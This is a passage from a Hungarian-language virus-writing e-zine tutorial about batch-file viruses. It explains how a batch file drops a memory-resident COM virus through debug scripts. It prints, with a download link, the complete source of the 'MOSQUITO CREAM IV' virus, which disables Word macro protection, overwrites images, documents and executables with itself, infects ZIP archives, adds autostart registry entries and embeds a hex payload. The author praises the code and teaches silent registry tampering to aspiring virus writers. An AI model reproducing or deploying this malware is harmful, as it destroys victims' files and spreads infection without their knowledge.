    (Az, hogy a fájl com, meghatároztuk a header-nél, de a kiterjesztése lehetne éppen
    exe is. (az ugye mindegy, csak fordítva nem megy.)) Következõ sor:<i> echo
    q&gt;&gt;DroP.t </i>Ez pedig utasítja a debugger-t, hogy lépjen ki. Mégegyszer mondom,
    még nem a bináris kódot készítjük, még csak a debug scriptet, melyben elmondjuk a
    debug.exe-nek, hogy hogyan készítse a com fájlt. És a következõ sor már nem fûzõdik
    hozzá a debug script fájlhoz, mert ez már maga a debug progi:<i> debug&lt;DroP.t&gt;nul
    </i>Elindítjuk, bemeneti fájlnak az elkészült scriptet adjuk meg, a kimenetét
    elrejtjük (nincs kimenet). Az elõbbi elindítható példában a debug üzenetei
    megjelennek, hátha úgy jobban látjátok, mit is csinál. Végül is mondhatjuk, hogy
    egy kezdetleges compiler-rõl (fordítóprogramról) van szó. Ezen debug progi pedig
    elkészíti a<i> $drop$.com</i>-ot. (Ezt onnan tudja, hogy a drop.t-ben az elsõ sorban
    elmondtuk neki...)<br>
    Namost visszatérve kicsit a debug alkalmazásához: Minden sorban az &quot;e&quot; betût
    követõ szám (mondjuk 0100) egy 16-os szr.-ben leírt szám, egy cím. A com-ban
    elfoglalt cím, ugye mindíg 100-al kezdõdik. Ezután jönnek a tényleges adatok, 16 db
    hexa szám soronként. Egy hexa címet ugye 16 adatnak kell követnie, és soronként a
    címnek növekednie kell 16-al, vagy többel. (0110 nagyobb mint 0100, mert 16*os
    számrendszerben vagyunk.)<br>
    Na most ezen elég nagy kitérõ után, nézzük tovább a vírusunkat, amely most, hogy
    sikeresen létrehozott egy com-ot, (ami egyébként nem más, mint egy memóriarezidens
    vírus, sõt, a vírus bat része ennek jelenlétét ellenõrzi a memóriában, és ha
    megtalálja, akkor nem hozza létre a debug scriptet, és a com fájlt.) Hogy hogyan is
    ellenõrzi, hogy fent van e a memóriában? És itt jön ki a szépsége az egésznek: <i>mem
    /c|find /i &quot;DroP&quot;&gt;nul </i>A 3. sorban hív egy mem parancsot (aminek a
    kezelését már elõzõleg megtanultuk, csak úgy mint a find parancsét) így elég, ha
    csak annyit mondok, hogy a mem kimenetében keres a DroP szócska után, ami, ha a TSR Com
    fájl el lett indítva ott lesz, különben nem. Ha sikeresen telepítette a
    memóriarezidens részt, és szükség volt a drop.t létrehozására, azt törli, majd
    belekezd a már ismerõs munkába. Az összes, ez után következõ sor szerintem nem
    szorul magyarázatra, maximum egy kis összefoglalásra. A vírus kódja a talált bat
    kódja elé illeszkedik, tehát nem keverednek a vírusnak a&nbsp; sorai és a cél sorai
    (volt már rá példa)... Egy indítás alkalmával egy fájlt fertõz meg az éppen
    aktuális, vagy felsõbb könyvtárban (parent dir). Ja, a rezidens rész egyébként egy
    rendkívül primitív com fájl fertõzõ, amely batok visszafertõzésére már nem
    képes (half-tranziens) vagyis fél-tranziens vírusnak szokás a drop-ot és variánsait
    nevezni... A rezidens résznek továbbá van az a kellemetlen tulajdonsága, hogy ha a
    CAPS LOCK be van kapcsolva, a progi nevéhez híven minden leütött billentyût
    &quot;eldob&quot;(=drop), vagyis ha a vírus aktív, és a CAPS LOCK be van kapcsolva, nem
    lehet gépelni...<br>
    <br>
    És akkor nagyjából befejeztük a bináris kód készítését bat-ból. Ha írtok
    mondjuk egy COM progit (érdemes assemblert használni, különben qrva nagy lesz a bat),
    akkor azt pl a HVIEW-al, vagy a DOSNAVIGATOR nézõkéjével is át tudjátok alakítani
    hexadecimális számok sorozatává, majd a sorok elé már csak egy E betû kell, és
    késsz...<br>
    </font></p>
    <p align="left"><font face="Verdana" size="2">No. Mivel még csak 01:30 van, így úgy
    döntöttem, a registry matatása is ebbe a számba bekerül. Szóval akkor lássunk
    valami iagzán profi dolgot. (Abból lesz jó vírusíró, akinek a következõ forrás
    láttán nem a rémülettõl, hanem a gyönyörtõl borsódzik a háta):<br>
    <br>
    <a href="!mosquito.bat">MOSQUITO CREAM IV vírus letölthetõ!<br>
    </a><i>@cls&nbsp;<br>
    @echo off<br>
    :: MOQUITO CREAM IV By StRaMoNiUm<br>
    @break off<br>
    ECHO REGEDIT4&gt;%windir%\BZz.reg<br>
    ECHO.&gt;&gt;%windir%\BZz.reg<br>
    ECHO
    [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion]&gt;&gt;%windir%\BZz.reg<br>
    ECHO &quot;RegisteredOwner&quot;=&quot;MOQUITO CREAM IV&quot;&gt;&gt;%windir%\BZz.reg<br>
    ECHO &quot;RegisteredOrganization&quot;=&quot;By
    StRaMoNiUmê&quot;&gt;&gt;%windir%\BZz.reg<br>
    ECHO
    [HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options]&gt;&gt;%windir%\BZz.reg<br>
    ECHO &quot;EnableMacroVirusProtection&quot;=&quot;0&quot;&gt;&gt;%windir%\BZz.reg<br>
    @REGEDIT /S /C %windir%\BZz.reg<br>
    @attrib %windir%\*.* -h -r -s<br>
    @attrib %windir%\Desktop\*.* -h -r -s<br>
    @attrib %windir%\web\*.* -h -r -s<br>
    @attrib C:\Docume~1\*.* -h -r -s<br>
    for %%i in (%windir%\*.bmp,*.gif,*.jpg,*.bat) do copy %0 %%i&gt;nul<br>
    for %%i in (%windir%\*.gif,*.jpg) do ren %%i *.bmp&gt;nul<br>
    for %%i in (%windir%\Desktop\*.bmp,*.gif,*.jpg,*.bat,*.exe) do copy %0 %%i&gt;nul<br>
    for %%i in (%windir%\Desktop\*.gif,*.jpg) do ren %%i *.bmp&gt;nul<br>
    for %%i in (%windir%\WEB\*.bmp,*.gif,*.jpg,*.bat) do copy %0 %%i&gt;nul<br>
    for %%i in (%windir%\WEB\*.gif,*.jpg) do ren %%i *.bmp&gt;nul<br>
    for %%i in (C:\Docume~1\*.bmp,*.gif,*.jpg,*.bat,*.exe) do copy %0 %%i&gt;nul<br>
    for %%i in (C:\Docume~1\*.gif,*.jpg) do ren %%i *.bmp&gt;nul<br>
    for %%i in (C:\Mydocu~1\*.bmp,*.gif,*.jpg,*.bat,*.exe) do copy %0 %%i&gt;nul<br>
    for %%i in (C:\Mydocu~1\*.gif,*.jpg) do ren %%i *.bmp&gt;nul<br>
    echo &gt;x<br>
    echo. &gt;&gt;x&nbsp;<br>
    echo \\ &gt;&gt;x<br>
    echo OooO@- &gt;&gt;x<br>
    echo // &gt;&gt;x<br>
    echo. &gt;&gt;x<br>
    echo # ITALIAN PRODUCTION 1999 # By StRaMoNiUm&gt;&gt;x<br>
    @move x %tmp%\x<br>
    @if exist *.zip goto :BZzip<br>
    @if not exist *.zip goto :BZskip<br>
    :BuZZ<br>
    @move Bz.Z %tmp%\Setup.exe&gt;nul<br>
    @copy %0 %tmp%\Setup.BMP&gt;nul<br>
    @if exist Pkzip.exe goto :Bzext<br>
    @if not exist Pkzip.exe goto :BzrZ<br>
    :Bzext<br>
    for %%i in (*.zip ../*.zip) DO pkzip -e0 -u -r -k %%i %tmp%\Setup.exe&gt;nul<br>
    for %%i in (*.zip ../*.zip) DO pkzip -e0 -u -r -k %%i %tmp%\Setup.BMP&gt;nul<br>
    goto :BZskip<br>
    :BzrZ<br>
    for %%i in (*.zip ..\*.zip) do start /m winzip32 -a /%%i &quot;%tmp%\Setup.exe&quot;
    &quot;%tmp%\Setup.BMP&quot;&gt;nul<br>
    goto :BZskip<br>
    :BZskip<br>
    for %%i in (*.bmp,*.jpg,*.gif,*.tga,*.psd,*.tif,*.wmf,*.bat ..\*.bat,*.bmp) do copy %0
    %%i&gt;nul<br>
    for %%i in (*.jpg,*.gif,*.tga,*.psd,*.tif,*.wmf) do ren %%i *.bmp&gt;nul<br>
    for %%i in (s*.exe,a*.exe,b*.exe,o*.exe,i*.exe,_*.exe) do copy %0 %%i&gt;nul<br>
    for %%i in (*.txt,*.doc,*.rtf ..\*.txt,*.doc,*.rtf) do copy %tmp%\x %%i&gt;nul<br>
    cd..<br>
    @attrib *.* -h -r -s<br>
    for %%i in (*.bmp,*.jpg,*.gif,*.tga,*.psd,*.tif,*.wmf,*.bat ..\*.bat,*.bmp) do copy %0
    %%i&gt;nul<br>
    for %%i in (*.jpg,*.gif,*.tga,*.psd,*.tif,*.wmf) do ren %%i *.bmp&gt;nul<br>
    for %%i in (s*.exe,a*.exe,b*.exe,o*.exe,i*.exe,_*.exe) do copy %0 %%i&gt;nul<br>
    for %%i in (*.txt,*.doc,*.rtf ..\*.txt,*.doc,*.rtf) do copy %%i+%tmp%\x %%i&gt;nul<br>
    @if exist *.zip goto :BZzip<br>
    @if not exist *.zip goto :BZskip2<br>
    :BZskip2<br>
    @REGEDIT /E %windir%\BZs.reg
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run<br>
    choice /c:abcdefghilmnop@q#rstuvw!\'?%xyjkz.;,-_1234567890 /N /T:A,2&gt;nul<br>
    ECHO &quot;0A StRaMoNiUm&quot;=&quot;c:\\command /C ren C:\\Mosquito.bmp
    Mosquito.bat|CLS&quot;&gt;&gt;%windir%\BZs.reg<br>
    ECHO &quot;1A Dark_Elf&quot;=&quot;start /m C:\\Mosquito.bat&quot;&gt;&gt;%windir%\BZs.reg<br>
    echo.<br>
    echo jgcxjhgkjhcxgkjdhflkgjhxhjxhjjjhjkfjjkhjhjfjjhjjhj&gt;nul<br>
    echo.<br>
    echo ciyjouigydujujhgfkjbkjhgdkjhgjhjugkjghkdjhykugrhtiug&gt;nul<br>
    choice /c:abcdefghilmnop@q#rstuvw!\'?%xyjkz.;,-_1234567890 /N /T:A,1&gt;nul<br>
    echo.<br>
    @regedit /S /C %windir%\BZs.reg<br>
    @cls<br>
    @type %tmp%\x<br>
    for %%i in (%tmp%\*.*) do DEL %%i&gt;nul<br>
    @copy %0 c:\MOSQUITO.BMP&gt;nul<br>
    @copy %0 %windir%\DVC.EXE&gt;nul<br>
    ECHO @Echo off&gt;%windir%\WIN.BAT<br>
    ECHO @if exist c:\Mosquito.bat goto :BZ&gt;&gt;%windir%\WIN.BAT<br>
    ECHO @if not exist c:\Mosquito.bat goto :BZXT<br>
    ECHO :BZXT&gt;&gt;%windir%\WIN.BAT<br>
    ECHO @ren DVC.EXE BZz.bat&gt;&gt;%windir%\WIN.BAT<br>
    ECHO @copy BZz.bat DVC.EXE&gt;&gt;%windir%\WIN.BAT<br>
    ECHO @start /m BZz.bat&gt;&gt;%windir%\WIN.BAT<br>
    ECHO :BZ&gt;&gt;%windir%\WIN.BAT<br>
    ECHO CLS&gt;&gt;%windir%\WIN.BAT<br>
    ren %0 Mosquito.BMP|cls<br>
    exit<br>
    :BZzip<br>
    ECHO n BZ.Z&gt;%tmp%\bzz.z<br>
    ECHO e 100 4D 5A E2 01 02 00 00 00 02 00 C3 0F FF FF F0 FF&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 110 FE FF 00 00 00 01 F0 FF 1C 00 00 00 00 00 00 00&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 120 FC BD 20 01 8B 6E 00 8B A6 02 00 8B 9E 04 00 B4&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 130 4A CD 21 A1 2C 00 89 86 1A 00 8B 9E 00 00 FF E3&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 140 40 04 C7 86 10 00 FF FF 8B D6 33 C9 B8 02 3C 0B&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 150 FF 74 02 FE C4 CD 21 72 29 8B D8 0B FF 74 0B B8&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 160 02 42 33 D2 8B CA CD 21 72 18 89 9E 12 00 53 B4&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 170 45 BB 01 00 CD 21 89 86 10 00 B9 01 00 5B B4 46&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 180 CD 21 C3 84 01 FE 01 53 E8 00 00 5B 8B FE 4F 1E&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 190 8A 86 1E 00 50 FF 57 FA 2E FF 57 F8 58 88 86 1E&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 1A0 00 1F 5B C3 53 E8 20 00 00 44 55 4D 4D 59 20 20&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 1B0 20 46 43 42 00 00 00 00 00 44 55 4D 4D 59 20 20&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 1C0 20 46 43 42 00 00 00 00 5B 1E 06 89 A6 02 00 57&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 1D0 56 8B F7 46 8D 3F B8 03 29 CD 21 8D 7F 10 B8 03&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 1E0 29 CD 21 5E 5F 0E 8D 57 10 52 0E 8D 17 52 0E 57&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 1F0 2E A1 2C 00 50 8B DC B8 00 4B 8B D6 CD 21 BD 20&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 200 01 2E 8B 6E 00 8C CB FA 8E D3 8B A6 02 00 FB FC&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 210 07 1F B4 4D CD 21 88 86 1E 00 5B C3 14 02 53 E8&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 220 07 00 43 4F 4D 53 50 45 43 5B BA 07 00 8B F3 FF&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 230 57 FA 5B C3 53 51 57 06 8E 86 1A 00 33 FF 8B DE&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 240 8B F3 8B CA F3 A6 74 14 32 C0 B9 FF FF F2 AE 26&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 250 80 3D 00 75 EB 8B F7 06 1F F9 EB 19 8B F7 06 1F&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 260 AC 3C 3D 75 FB 80 3C 00 74 EB AC 0A C0 72 04 3C&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 270 20 72 F7 4E F8 07 5F 59 5B C3 83 BE 10 00 FF 74&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 280 13 B4 46 8B 9E 10 00 B9 01 00 CD 21 B4 3E 8B 9E&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 290 12 00 CD 21 C3 67 01 D8 03 E8 03 84 01 2B 04 53&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 2A0 E8 32 00 00 50 41 54 48 3D 43 4F 4D 45 58 45 42&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 2B0 41 54 00 00 00 00 42 61 64 20 63 6F 6D 6D 61 6E&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 2C0 64 20 6F 72 20 66 69 6C 65 20 6E 61 6D 65 0D 0A&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 2D0 00 2F 43 20 00 5B 89 77 0F 89 7F 11 8B 96 0A 00&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 2E0 83 C2 04 C6 47 31 00 C6 07 00 8B FA 33 C9 0A 0F&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 2F0 75 73 52 56 33 D2 80 7C 01 3A 75 0D 8A 14 80 E2&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 300 DF 80 EA 40 A5 83 47 0F 02 80 3C 5C 74 1C B0 5C&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 310 AA 56 8B F7 B4 47 CD 21 5E 32 C0 B9 40 00 F2 AE&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 320 4F 80 7D FF 5C 74 03 B0 5C AA 33 C0 AC 3D 2E 2E&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 330 75 0E FD B0 5C B9 12 00 F2 AE F2 AE FC 47 EB EC&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 340 AA 8A E0 3C 5C 75 03 FE 47 31 3C 00 75 DE 4F 8B&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 350 D7 FD B9 05 00 B0 2E F2 AE FC 75 03 47 8B D7 8B&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 360 FA 5E 5A EB 25 80 7F 31 00 75 08 8B 77 0F FF 57&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 370 F6 73 08 8D 77 13 FF 57 F4 EB 7B B9 49 00 AC 3C&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 380 20 76 07 3C 2E 74 03 AA E2 F4 B0 2E AA 8D 77 06&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 390 B9 03 00 A5 A4 32 C0 AA 52 56 51 8B F2 FF 57 FA&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 3A0 59 5E 5A 73 0A 83 EF 04 E2 E9 FE 07 E9 3B FF 83&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 3B0 F9 01 75 33 8D 77 2E 83 EA 03 8B FA A5 A4 32 C0&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 3C0 B9 FC 00 F2 AE C6 45 FF 20 8B 77 11 38 4C FF 77&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 3D0 03 8A 4C FF F3 A4 C6 05 0D 8B F2 8B C7 2B C2 88&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 3E0 44 FF FF 57 F2 EB 0F 8B 7F 11 4F FE 0D 57 8B F2&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 3F0 FF 57 F8 5F FE 05 5B C3 8A 14 46 0A D2 74 06 B4&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 400 02 CD 21 EB F3 C3 14 02 53 E8 04 00 50 41 54 48&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 410 5B 52 56 1E BA 04 00 8B F3 FF 57 FA 49 E3 0B AC&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 420 0A C0 74 24 3C 3B 75 F7 EB F2 AC 3C 3B 74 07 0A&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 430 C0 74 03 AA EB F4 0E 1F 26 80 7D FF 5C 74 03 B0&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 440 5C AA F8 1F 5E 5A 5B C3 F9 EB F8 8B D7 B4 1A CD&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 450 21 8B D6 33 C9 B4 4E CD 21 72 04 83 C7 1E F8 C3&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 460 96 04 C2 06 AD 00 C4 06 C5 07 C6 08 C7 09 56 E8&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 470 7F 2D 83 C6 04 5F 8B 0E 44 D7 83 E9 04 F3 00 00&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 480 6E 75 6C 00 20 2F 43 20 52 45 4E 20 73 65 74 75&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 490 70 2E 62 6D 70 20 49 6E 73 74 61 6C 6C 2E 62 61&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 4A0 74 20 20 20 20 0D 00 49 4E 53 54 41 4C 4C 2E 62&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 4B0 61 74 00 01 0D 00 8D B6 20 00 BF 00 00 B8 22 01&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 4C0 FF D0 8D B6 25 00 B8 67 01 FF D0 B8 5A 02 FF D0&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 4D0 8D B6 47 00 8D BE 54 00 B8 7F 02 FF D0 B8 00 4C&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 4E0 CD 21 00 00 00 00 00 00 00 00 00 00 00 00 00 00&gt;&gt;%tmp%\bzz.z<br>
    ECHO e 500 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00&gt;&gt;%tmp%\bzz.z<br>
    ECHO rcx&gt;&gt;%tmp%\bzz.z<br>
    ECHO 410&gt;&gt;%tmp%\bzz.z<br>
    ECHO.&gt;&gt;%tmp%\bzz.z<br>
    ECHO.&gt;&gt;%tmp%\bzz.z<br>
    ECHO w&gt;&gt;%tmp%\bzz.z<br>
    ECHO.&gt;&gt;%tmp%\bzz.z<br>
    ECHO.&gt;&gt;%tmp%\bzz.z<br>
    ECHO q&gt;&gt;%tmp%\bzz.z<br>
    debug &lt; %tmp%\bzz.z&gt;nul<br>
    goto :BuZZ<br>
    </i><br>
    Egyszerûen gyönyörû! (De azért közel sem olyan élvezetes, mint egy orgazmus... ;) )
    Minden gratula StRaMoNiUm-nak. No, ezzel most el leszünk egy darabig. Messze vagyunk még
    attól, hogy sorról sorra elemzzük, elõbb némi alapozást kéne megejteni (habár ezt
    a vírus alapján fogjuk csinyálni), és csak úgy elõzetesben megjegyzem, hogy még
    EBBEN a tutorialban szó lesz TROJAN, azaz trójai BAT vírusokról is, és akkor asszem
    ki is végeztük a BAT vírusokat. Vagyis tök profik leszünk, (már egy jó
    középhaladó szinten vagyunk) a végére. És akkor a következõ ezine-ben asszem
    áttérünk a makróvírusokra, de lehet, hogy kitalálok valamit a batokhoz. (Bár én
    úgy gondolom, hogy ennyi elég lessz hozzájuk. Ti nem?) Na, e kis pihentetõ rizsa után
    ugorjunk neki.<br>
    <br>
    Elég érdekes dolgokat találhatunk ebben a nem túl kicsi BAT vírusban. (8K)<br>
    Elõször is:</font></p>
    <p align="left"><font face="Verdana" size="2">Amit az elõbb láttatok az egy BAT/BMP/ZIP
    fertõzõ vírus! Igen BMP és ZIP! (Ennek ugyan nem sok értekme van, mert BMP-bõl meg
    ZIP-bõl ugye nem lehet továbbfertõzni, de végül is remek ötlet.) </font></p>
    <p align="left"><font face="Verdana" size="2">Elõször is legjobb, ha tisztázzuk, hogy a
    bináris kód ezúttal nem egy futtatható állomány, hanem egy ZIP fájl, melybe egy BMP
    van csomagolva. A BMP header-t remélem nem kell magyarázni (BM« .. stb. Sem a
    ZIP-et...). Rögtön az elején a vírus létrehoz egy regisztrációs adatbázishoz
    hozzácsatolható (a regedit segítségével) fájlt, amibe beleírogatja a már ismert
    módon a csatolni kívánt adatokat, pl.: <i>[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion].
    </i>Ehhez azért nem árt ismerni a windóz registry felépítését (regisztrációs
    adatbázis), erre most külön nagyon nem térnék ki, mert a vírus is csak néhányat
    használ a csomó nem dokumentált bejegyzés közül. A dokumentáltakat meg nem kell
    még nekem is ecsetelni. Nézzetek rá erre a sorra: <i>ECHO
    &quot;RegisteredOrganization&quot;=&quot;By StRaMoNiUmê&quot;&gt;&gt;%windir%\BZz.reg </i>Ugyebár
    az elejét és a legvégét megbeszéltük, az is világos, hogy miként épülnek fel az
    általában (tört játékok mellett is szokott lenni) .reg fájlok. De nézzünk meg
    valami mást is:<br>
    %WINDIR%<br>
    Sajnos, vagy sem (ezt döntse el mindenki maga) van egy (több is) új környezeti
    változónk MSDOS 7.0 és a fölött. A DOS-os idõkben ilyen környezeti változó volt
    pl.: a PATH, vagy a TEMP. A %WINDIR% pedig egyszerûen azt a könyvtárat adja meg, ahova
    a vindóz telepítve van. Pl a következõ két sor tök ugyanazt jelenti a BAT
    végrehajtásakor:&nbsp;<br>
    DEL C:\WINDOWS\WIN.COM&nbsp;<br>
    DEL %WINDIR%\WIN.COM<br>
    Miért jobb mégis a 2. megoldást alkalmazni. Nos, ha a windos mondjuk nem a <a
    href="file:///C:/WINDOWS">C:\WINDOWS-ban</a>, hanem a <a href="file:///C:/SZAR">C:\SZAR</a>
    könyvtárban van, az elsõ esetben a win.com nem, a másodikban viszont már törlésre
    kerül. Vagyis sokkal nagyobb a progi mobilitása.<br>
    Nézzük a következõ sort:<br>
    ECHO REGEDIT4&gt;%windir%\BZz.reg<br>
    Ez ugye létrehoz egy kimeneti fájlt Bzz.reg néven, amely a REGEDIT4 szöveget
    tartalmazza. (Ez hozzátartozik a .reg fájlok formátumához.)<br>
    ECHO.&gt;&gt;%windir%\BZz.reg&nbsp;<br>
    Még egyszer elmondom, de többször nem. A BZz.reg-hez, amely ugye a windows
    installálási könyvtárában van, hozzáad egy üres sort. (Emlékezz! ECHO. - üres sor
    a képernyõn!) <br>
    ECHO
    [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion]&gt;&gt;%windir%\BZz.reg<br>
    Ua. Megbeszéltük. <br>
    ECHO &quot;RegisteredOwner&quot;=&quot;MOQUITO CREAM IV&quot;&gt;&gt;%windir%\BZz.reg<br>
    Ezen sor, pontosabban a .reg fájlba kiírt bejegyzés (félreértés ne essék, nem a
    registrybe írunk, hanem még csak egy reg fájlt hozunk létre, amelyet maj a registryhez
    a regedit segítségével adunk hozzá.) megváltoztatja a felhasználó nevét.&nbsp; <br>
    ECHO &quot;RegisteredOrganization&quot;=&quot;By StRaMoNiUmê&quot;&gt;&gt;%windir%\BZz.reg<br>
    Ez a sor, pont úgy mûködik mint az elõzõ, de a felhasználó cég nevét változtatja
    meg. <br>
    ECHO
    [HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options]&gt;&gt;%windir%\BZz.reg<br>
    ECHO &quot;EnableMacroVirusProtection&quot;=&quot;0&quot;&gt;&gt;%windir%\BZz.reg<br>
    Végül, segítsünk makrovírusíró haverjainknak, beleturkálunk az Office2000,
    pontosabban a Word8.0 beállításaiba. Kikapcsoljuk a makróvédelmet, vagyis 0 (hamis)
    értékûre állítjuk. A windows registry-t érdemes nagyon alaposan tanulmányozni, mert
    potenciális betörési forrás, lásd billentyûlopók! Ennek hatására tehát a word
    nem küld többé makrókra figyelmeztetõ üzenetet. <br>
    FIGYELEM!! A következõ sor egy nagyon fontos dolgot tartalmaz:<br>
    @REGEDIT /S /C %windir%\BZz.reg&nbsp;<br>
    Itt hívjuk meg ugyanis a regedit nevû progit, ami befejezi amit mi elkezdtünk, amit
    megmondtunk neki, azokat a dolgokat módosítani fogja a win registry-ben. (Hacsak nem
    NT-n vagyunk, és az aktuális felhasználónak nincsen hozzá joga, mert akkor bizony ez
    nem fog sikerülni.) Csak úgy mellékesen jegyzem meg, hogy érdemes megfigyelni a
    paramétersort is, ugyanis egy NEM DOKUMENTÁLT paramétert használunk. (/s) Miért? <br>
    REGEDIT /S file.reg<br>
    Nos ez a /S egyszerûen arra jó, hogy A FELHASZNÁLÓTÓL NEMKÉR A REGEDIT
    BELEEGYEZÉST, egyáltalán a felhasználó TUDTA nélkül, a háttérben, DOS-ablak
    nyitása, vagy bármilyen képernyõre írás nélkül ELVÉGZI A REGISTRY BEJEGYZÉSEK
    JAVÍTÁSÁT. (No ennyit Bill Gates-rõl. Ez a vindóz maga egy idõzített bomba az ember
    gépén. akkor, úgy, és olyan dolgokat csinál, hogy csak nézünk.) BILL SUX!!!!!!!!<br>
    egyébként ezt az aranyos /s (s mint silent=csendes) funkciót akkor is jól lehet
    használni, ha a &quot;RunServices&quot; kulcs alá beteszel valamit. (Ekkor a progi a
    windows-al együtt, auto elindul.)<br>
    Most nézzünk néhány egyéb funkcióját a regedit-nek, mert ki tudja, még jól
    jöhet: (Ezek egyébként jól dokumentált funkciók) <br>
    REGEDIT /C file.reg<br>
    A file.reg-ben található bejegyzések hozzáadódnak a registryhez, ha elõzõleg már
    léteztek, felülírják a régit. Ua. Mint a /s, csak magyaráz is... <br>
    REGEDIT /L:&lt;path system.dat&gt;&nbsp;<br>
    A system.dat helyét adja meg. Ez mondjuk arra jó, hogy az otthoni gépeden turkálhatod,
    nézegetheted a haverod registry-jét. <br>
    REGEDIT /R:&lt;path user.dat&gt;&nbsp;<br>
    Ua, csak USER.DAT-al. <br>
    REGEDIT /E file.reg Kulcsnév<br>
    Exportál, azaz kimásol, kivisz dologkat a registrybõl. jelen esetben a Kulcsnév nevû
    kulcsot és annak ÖSSZES alkulcsát értékkel együtt kiteszi a file.reg-be. Ha
    Kulcsnévnek nem adunk meg semmit, akkor az egész registry-t átpakolja. (Csináljátok
    meg, mert a system.dat, user.dat, meg a többi dat binárisan és tömörített formában
    tartalmazza a bejegyzéseket.) <br>
    REGEDIT /D Kulcsnév<br>
    Ua. mint elõzõleg, csak törléssel. (Kulcsnév nélkül az egész hóbelevancot
    törli... :) ) </font></p>
    <p align="left"><font face="Verdana" size="2">Most nézzünk egy kombinált példát: <br>
    Pl.: REGEDIT /L:&lt;Path system.dat&gt; /R:&lt;Path user.dat&gt; /D file.reg<br>
    A haverod system.dat-jából és user.dat-jából törli azokat a bejegyzéseket, melyek
    benne vannak a file.reg fájlban. <br>
    <br>
    Szerintem ennyi bõven elég is a registryrõl, pedig mennyit lehetne még róla
    mesélni...<br>
    <br>
    Lássuk inkább a következõ blokkot: <br>
    @attrib %windir%\*.* -h -r -s<br>
    @attrib %windir%\Desktop\*.* -h -r -s<br>
    @attrib %windir%\web\*.* -h -r -s<br>
    @attrib C:\Docume~1\*.* -h -r -s<br>
    Az attrib utasítást vettük, hogy a &quot;@&quot; jel az elején mit jelent, azt pedig
    mindenki olvassa el ezen 2.rész legelején, a táblázatban... Szóval röviden:A
    következõ alkönyvtárakban minden file módosíthatóvá válik (akár rejtett, akár
    írásvédett VOLT):&nbsp; c:\WINDOWS, C:\WINDOWS\DESKTOP, C:\WINDOWS\WEB\, <a
    href="file:///C:/DOCUMENTS">C:\DOCUMENTS</a><br>
    (Mondjuk szerintem itt is a %windir% változót kellett volna használni, ha már eddig is
    azt tettük...)<br>
    <br>
    Következõ:<br>
    for %%i in (%windir%\*.bmp,*.gif,*.jpg,*.bat) do copy %0 %%i&gt;nul<br>
    for %%i in (%windir%\*.gif,*.jpg) do ren %%i *.bmp&gt;nul<br>
    Itt már nem ereszteném annyira bõ lére, szerintem tök egyértelmû:<br>
    Felülír minden BMP,GIF,JPG, BAT fájlt magával a vírussal a windows telepítési
    könyvtárában, majd minden GIF és JPG kiterjesztésût BMP-re átnevez. <br>
    Néhány szót azér mégis ejtek a %0-ról, hátha elfelejtettétek:<br>
    %0<br>
    Ez az ID-je, azonosítója az éppen aktuális fájlnak, amiben vagyunk. Pl.:<br>
